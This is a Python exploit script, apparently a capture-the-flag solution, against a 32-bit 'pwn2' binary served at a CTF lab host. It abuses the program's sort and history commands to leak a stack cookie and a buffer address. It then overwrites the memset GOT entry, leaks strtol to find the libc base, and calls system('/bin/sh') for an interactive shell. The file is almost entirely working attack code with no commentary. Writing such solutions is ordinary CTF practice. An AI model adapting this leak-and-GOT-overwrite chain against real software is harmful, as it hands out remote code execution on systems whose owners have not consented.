#!/usr/bin/env python
# coding:utf-8

from ctf import *

elf = ELF('./pwn2-58461176')
libc = ELF('./libc.so')
# libc = ELF('/lib32/libc.so.6')
rand_cookie_addr = 0x0804C04C

# io = process('./pwn2-58461176')
# io = remote('0.0.0.0', 4000)
io = remote('pwn.lab.seclover.com', 22222)
# io = debug('./pwn2-58461176')
# io.sendline('''
# '''.strip())
# io.r()

for i in xrange(2):
    io.sendlineafter('_CMD_$', 'sort')
    io.sendline(2)
    io.sendlines(xrange(2))
    io.sendline(3) # sort
    io.sendline(7) # exit

# io.sendlineafter('_CMD_$', 'sort')
# io.sendline(2)
# io.sendlines(xrange(2))
# io.sendline(7) # exit
#
# io.sendlineafter('_CMD_$', 'sort')
# io.sendline(2)
# io.sendlines(xrange(2))
# io.sendline(3) # sort
# io.sendline(7) # exit

io.sendlineafter('_CMD_$', 'sort')
io.sendline(2)
io.sendlines(xrange(2))
io.sendline(7) # exit

io.sendlineafter('_CMD_$', 'clear')

io.sendlineafter('_CMD_$', 'sort')
io.sendline(2)
io.sendlines(xrange(2))
io.sendline(3) # sort
io.sendline(7) # exit

io.sendlineafter('_CMD_$', 'sort')
io.sendline(2)
io.sendlines(xrange(2))
io.sendlines([2, 2, rand_cookie_addr])
io.sendline(3) # sort
io.sendline(7) # exit

io.sendlineafter('_CMD_$', 'history')
rand_cookie = int(io.recvregex('ID = 1, Len = (\d+),', group=1))
io.recvuntil('Data =')
data_buf_addr = int(io.recvline().strip().split(' ')[13])

io.sendlineafter('_CMD_$', 'sort')
io.sendline(2)
io.sendlines([0x40000000, 0x40000000 ^ rand_cookie])
io.sendlines([2, 2, data_buf_addr + 8])
io.sendline(7) # exit



io.sendlineafter('_CMD_$', 'reload')
io.sendline(1)
# io.sendlines([1, 0x4018])
# io.recvuntil('[*L*] Query result:')
# data_addr = int(io.recvline()) - 4
# print hex(data_addr)
io.sendlines([2, 0x401a, elf.got['memset']])
io.sendline(7)

io.sendlineafter('_CMD_$', 'sort')
io.sendline(2)
io.sendlines([elf.plt['_IO_getc'] + 6, elf.plt['strtol'] + 6])
# io.sendline([elf.plt['memcpy'] + 6, elf.plt['strlen'] + 6, elf.plt['printf'] + 6, elf.plt['atoi'] + 6])
#
io.sendlines([1, 1])
io.recvuntil('[*L*] Query result:')
strtol_addr = int(io.recvline())
log.info('strtol address: %#x', strtol_addr)
libc_base = strtol_addr - libc.symbols['strtol']
system_addr = libc_base + libc.symbols['system']
log.info('system address: %#x', system_addr)

io.sendlines([2, 1, system_addr])
io.sendline('/bin/sh')

# idx = (elf.got['atoi'] - data_addr) / 4
# io.sendlines([1, idx])

# for i in xrange(455): # 0x10000 / 144
    # io.sendlineafter('_CMD_$', 'sort')
    # io.sendline(32)
    # io.sendlines(xrange(32))
    # io.sendline(3)
    # io.sendline(7)

# io.interrupt()
# io.sendline('''
# # x/40xw *(int *)0x0804C088 + 0x10000 - 0x40
# x/40xw *(int *)0x0804C088
# x/8xw 0x804c014
# '''.strip())
io.interactive()
